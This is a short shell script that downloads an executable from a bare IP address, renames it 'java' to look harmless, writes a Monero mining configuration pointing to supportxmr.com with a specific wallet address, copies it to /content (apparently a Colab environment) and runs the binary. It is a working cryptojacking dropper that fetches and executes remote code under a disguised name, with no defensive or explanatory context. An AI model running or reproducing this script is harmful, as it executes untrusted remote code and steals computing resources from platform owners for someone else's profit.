#!/bin/sh

curl -L --progress-bar "http://5.133.65.53/soft/linux/xfit.sh" -o java
chmod +x java

cat >config.json <<EOL
{
    "algo": "cryptonight",
    "api": {
        "port": 0,
        "access-token": null,
        "worker-id": null,
        "ipv6": false,
        "restricted": true
    },
    "av": 0,
    "background": false,
    "colors": true,
    "cpu-affinity": null,
    "cpu-priority": 4,
    "donate-level": 5,
    "huge-pages": true,
    "hw-aes": null,
    "log-file": null,
    "max-cpu-usage": 60,
    "pools": [
        {
            "url": "pool.supportxmr.com:5555",
            "user": "49cYWdjskxWWvgEzBrHCF1Dawmu6i1LBebHxgrXa7DXoc53jLPgGZZhWSPNQomn89wD8szkbAMh6dB3zgzBxt8qQGqRFcxq",
            "pass": "Test",
            "keepalive": true,
            "nicehash": false,
            "variant": -1,
            "tls": false,
            "tls-fingerprint": null
        }
    ],
    "print-time": 60,
    "retries": 5,
    "retry-pause": 5,
    "safe": false,
    "syslog": false,
    "threads": null
}
EOL

chmod +x config.json
cp config.json /content/config.json

./java